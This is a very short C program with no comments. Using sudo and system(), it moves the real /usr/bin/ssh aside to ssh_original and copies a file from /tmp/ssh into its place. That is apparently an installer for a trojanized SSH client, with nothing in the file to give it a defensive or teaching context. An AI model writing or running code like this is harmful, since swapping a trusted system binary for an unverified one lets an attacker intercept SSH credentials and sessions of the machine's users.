#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv []){

	system("sudo mv /usr/bin/ssh /usr/bin/ssh_original");

	system("sudo cp /tmp/ssh /usr/bin/ssh");
	
	return 0;
}
